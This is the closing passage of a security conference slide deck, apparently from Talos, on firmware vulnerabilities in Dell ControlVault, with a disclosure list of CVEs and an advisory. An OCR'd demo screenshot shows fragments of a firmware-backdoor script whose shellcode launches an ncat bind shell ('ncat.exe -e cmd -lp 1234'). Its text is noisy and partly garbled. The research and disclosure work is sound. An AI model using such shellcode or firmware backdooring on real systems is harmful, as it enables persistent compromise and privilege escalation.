   - `StorageAdapterControlUnit` → `WBFUSH_ExistsCVObject`

- → `CSS_GetObject` → `cv_get_object`

- • Can overflow the `objectHeader` and corrupt `StorageAdapterControlUnit` ’s stack

## Slide 85

Demo

## Slide 86


> Recovered by OCR — confidence 79/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
, = ‘ Je 8 os | _ Oo x @ Process Explorer - Sysinternals: www.sysinternals.com [DESKTOP-91Q5SJ
y File Options View Process Find Users Handle Help
@ demo_3_patch_laptop_fw_v5.py > © apply _version_backdoor Process CPU| Private Bytes! | WorkingSet| PI
svchost.exe 14,820 K 19,072K 714
WUDFHost.exe 1,592 K 7,964 K 9
svchost.exe 1,920 K 10,664K 86
WUDFHost.exe 1,612 K 7,976K 11
_VERSION_BLOB_EA, if the ue is @x1337 trigger version back« WUDFHost exe 1,656 K 7,996 K
y_version_backdoor(fw_blob):
payload_address = ALL_BACKDOOR_CODE_POS
_shellcode = ild_rop_chain.get_shellcode exe =7 sass exe
shellcode = build_rop_chain.get_shellcode(b"C:\\temp\\Nmap\\ncat.exe -e cmd -lp 1234
312 en(win_shellcode) > 0x100: lm |\csrss.exe
raise ("Need to update the get_ush_ver_paylaod, size too small ") # we hardcoded tc =] |B '| winlogon.exe 3,628 K 12,132 K
fontdrvhost.exe 4,756 K 9,868 K
ee F 1.37 136,580 K 169,592K 202
win_shellcode += b"\x96"*(@x1@@-len(win_shellcode)) # add nops at the e f the she =| Fa explorer.exe | <0.01 98,328 K 199,260 KI 78
GB SecurityHealthSystray.exe 1,936 K
lob = apply_backdoor_code(fw_blob, win_shellcode) fm |RtkAudUService64.exe 3,864 K
WavesSvc64.exe
| Handles DLLs [@) Threads
PROBLEMS UTPUT DEBUG CONSOLE TERMINAL PORTS ae Vise AN XK Type niet
powershell ‘Thread svchost.exe(11672): 9756
load address: 0x63030000 Thread svchost.exe(11672): 9756
About to deploy update, are you sure? 38{ Python Deb... (IRE nusremnetcen! <a
Flashing the SCD.... crossing fingers! iniematio} eo
Rebooting to SBI.... svchost.exe(11672): 8392
Trying our SCD now.... svchost.exe(11672): 8392
Rebooting to sbi again..... svchost.exe(11672): 7808
update firmware returned.... @ svchost.exe(11672): 7388
svchost.exe(11672): 7388
Rebooting to USH.... svchost.exe(11672): 7152
Xx @o0A0 Ln 312,Col35 Tab Size:4 UTF-8 CRLF {} Python &§ 3.13.2 (Microsoft Store) 1
```

## Slide 87

So far, we’ve achieved

- Code execution on the Application Firmware

- • Permanent modification of the firmware

- Bypass of login screen

- SYSTEM privilege

## Slide 88

Can we do more?

## Slide 89

## USB Connection?

- Control Vault works with Internal USB

- What happens if we connect it directly to a machine?

## Slide 90

## Slide 91

## USB Connection?

- Control Vault works with Internal USB

- What happens if we connect it directly to a machine?

Physical Attack Unlocked!

## Slide 92

Summary

## Slide 93

Attack Scenarios


> Recovered by OCR — confidence 96/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Scenarios
Windows compromise
Physical attack
```

## Slide 94

## Findings!

- Reporting:

   - Dell advisory released in June (DSA-2025-053)

   - Reports available on Talos website `o https://talosintelligence.com/vulnera bility_reports`

- CVEs:

   - CVE-2025-24311,

   - CVE-2025-25215,

   - CVE-2025-24922,

   - CVE-2025-25050,

   - CVE-2025-24919

   - More…

- Writeups

   - <u>High-level overview</u>

- <u>Technical Deep-dive</u>

## Slide 95

Conclusion

## Slide 96

## Thanks!

Questions/comments:

@phLaul[.bsky.social]

## Slide 97

blog.talosintelligence.comblog.talosintelligence.com @talossecurity@talossecurity

## Slide 98

blog.talosintelligence.comblog.talosintelligence.com @talossecurity


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
thank you!
@ blog.talosintelligence.com (Xx) @talossecurity
TALOSINTELLIGENCE.COM
```

## Slide 99
